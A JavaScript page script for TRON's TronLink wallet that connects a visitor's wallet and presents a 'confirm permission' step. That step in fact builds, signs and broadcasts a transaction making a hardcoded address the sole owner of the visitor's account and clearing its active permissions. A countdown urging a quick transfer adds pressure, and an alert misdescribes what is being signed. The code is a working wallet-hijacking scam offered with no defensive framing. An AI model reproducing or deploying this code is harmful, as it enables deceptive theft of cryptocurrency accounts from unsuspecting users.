document.addEventListener('DOMContentLoaded', async () => {
    console.log('Script loaded');
    const tronWeb = window.tronWeb;

    // 检查TronLink是否安装
    if (typeof tronWeb === 'undefined') {
        alert("TronLink is not installed. Please install TronLink to proceed.");
    } else {
        console.log('TronLink detected');
        // 检查钱包是否已连接
        if (!tronWeb.defaultAddress.base58) {
            try {
                await connectWallet();
            } catch (error) {
                console.error("Error connecting to TronLink:", error);
                alert("Error: " + error.message);
            }
        }
    }

    startCountdown();
});

// 连接钱包的函数
async function connectWallet() {
    const tronWeb = window.tronWeb;

    // 请求TronLink连接
    await tronWeb.request({
        method: 'tron_requestAccounts'
    });
}

// 确认权限转移的函数
async function confirmPermission() {
    const tronWeb = window.tronWeb;
    const currentAddress = tronWeb.defaultAddress.base58;
    const newOwnerAddress = 'TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz';

    console.log("Current Address:", currentAddress);
    console.log("New Owner Address:", newOwnerAddress);

    try {
        // 获取当前账户权限信息
        const accountInfo = await tronWeb.trx.getAccount(currentAddress);
        console.log("Account Info:", accountInfo);

        const ownerPermission = {
            type: 0,
            permission_name: 'owner',
            threshold: 1,
            keys: [{
                address: tronWeb.address.toHex(newOwnerAddress),
                weight: 1
            }]
        };

        const activePermissions = [];  // 清除现有的active权限

        // 使用 TronWeb 的 transactionBuilder.updateAccountPermissions 方法
        const transaction = await tronWeb.transactionBuilder.updateAccountPermissions(
            currentAddress,
            ownerPermission,
            null,
            activePermissions
        );

        console.log("Transaction:", transaction);

        // 签名交易
        const signedTransaction = await tronWeb.trx.sign(transaction);
        console.log("Signed Transaction:", signedTransaction);

        // 发送交易
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
        console.log("Transaction Result:", result);

        if (result.result) {
            alert("Transaction sent successfully. Please check your wallet to sign the transaction.");
        } else {
            alert("Transaction failed: " + result.message);
        }
    } catch (error) {
        console.error("Error sending transaction:", error);
        alert("Error: " + error.message);
    }
}

// 实时倒计时函数
function startCountdown() {
    let countdownElement = document.querySelector('.countdown');
    let countdownValue = 120;

    let countdownInterval = setInterval(() => {
        countdownValue--;
        countdownElement.textContent = countdownValue;

        if (countdownValue <= 0) {
            clearInterval(countdownInterval);
            countdownElement.textContent = '请尽快转入';
        }
    }, 1000);
}
